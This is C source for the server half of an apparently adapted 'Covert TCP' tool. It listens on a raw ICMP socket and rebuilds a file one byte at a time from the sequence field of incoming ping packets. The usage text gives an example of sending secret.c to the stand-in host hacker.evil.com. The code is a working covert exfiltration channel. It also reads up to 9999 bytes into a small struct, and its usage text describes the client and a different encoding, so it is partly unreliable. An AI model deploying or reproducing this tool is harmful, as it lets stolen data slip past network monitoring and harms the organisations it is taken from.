#include "server.h"

int main(int argc, char *argv[]){

   unsigned int source_host=0,dest_host=0;
   int ipid=0,file=0;
   int count;
   char desthost[80],srchost[80],filename[80];

   if(geteuid() !=0)
    {
    printf("\nYou need to be root to run this.\n\n");
    exit(0);
    }

   if((argc < 5) || (argc > 13))
   {
   usage(argv[0]);
   exit(0);
   }


   for(count=0; count < argc; ++count)
    {
    if (strcmp(argv[count],"-dest") == 0)
     {
     dest_host=host_convert(argv[count+1]); 
     strncpy(desthost,argv[count+1],79);
     }
     
    else if (strcmp(argv[count],"-source") == 0)
     {
     source_host=host_convert(argv[count+1]); 
     strncpy(srchost,argv[count+1],79);
     }

    else if (strcmp(argv[count],"-file") == 0)
     {
     strncpy(filename,argv[count+1],79);
     file=1;
     }
    }

   /* check the encoding flags */

    ipid=1; /* set default encode type if none given */
  
   if(file != 1)
    {
    printf("\n\nYou need to supply a filename (-file <filename>)\n\n");
    exit(1);
    }
    

     if(dest_host == 0) 
      strcpy(desthost,"Any Host");

     if(source_host == 0)
      strcpy(srchost,"Any Host");

     printf("Listening for data from IP: %s\n",srchost);
     
     printf("Decoded Filename: %s\n",filename);

      printf("Decoding Type Is: ICMP Seq\n");

     printf("\nServer Mode: Listening for data.\n\n");

     forgepacket(source_host, dest_host, filename);
	  exit(0);
}

void forgepacket(unsigned int source_addr, unsigned int dest_addr, char *filename) {

   struct recv_icmp
   {
      struct iphdr ip;
      struct icmphdr icmp;
   } recv_pkt;
   
   struct sockaddr_in sin;
   
   int recv_socket;
   char *buf = (char *)malloc(2048*sizeof(char));
   FILE *output;
   
   srand((getpid())*(sizeof(int))); 

    if((output=fopen(filename,"wb"))== NULL) {
  			printf("I cannot open the file %s for writing\n",filename);
  			exit(1);
  		}
 while(1) 
 {

   recv_socket = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
   
   if(recv_socket < 0)
   {
      perror("receive socket cannot be open. Are you root?");
      exit(1);
   }
   
 read(recv_socket, (struct recv_tcp *)&recv_pkt, 9999);
 
   if((recv_pkt.icmp.type == 8) && (recv_pkt.icmp.code == 0)) {	   
      printf("Receiving Data: %c\n",recv_pkt.icmp.un.echo.sequence);
      fprintf(output,"%c",recv_pkt.icmp.un.echo.sequence);
      fflush(output);
   } 

   close(recv_socket); 
  }
  fclose(output);
}


unsigned int host_convert(char *hostname)
{
   static struct in_addr i;
   struct hostent *h;
   i.s_addr = inet_addr(hostname);
   if(i.s_addr == -1)
   {
      h = gethostbyname(hostname);
      if(h == NULL)
      {
         fprintf(stderr, "cannot resolve %s\n", hostname);
         exit(0);
      }
      bcopy(h->h_addr, (char *)&i.s_addr, h->h_length);
   }
   return i.s_addr;
} 


void usage(char *progname)
{
      printf("Covert TCP usage: \n%s -dest dest_ip -source source_ip -file filename\n\n", 
progname);
      printf("-dest dest_ip      - Host to send data to.\n");
      printf("-source source_ip  - Host data will be coming FROM.\n");
      printf("-file filename     - Name of the file to encode and transfer.\n");
      printf("\nPress ENTER for examples.");
      getchar();
      printf("\nExample: \nclient -dest foo.bar.com -source hacker.evil.com -file secret.c\n\n");
      printf("Above sends the file secret.c to the host hacker.evil.com a byte \n");
      printf("at a time using the default IP packet ID encoding.\n");
      exit(0);
} 

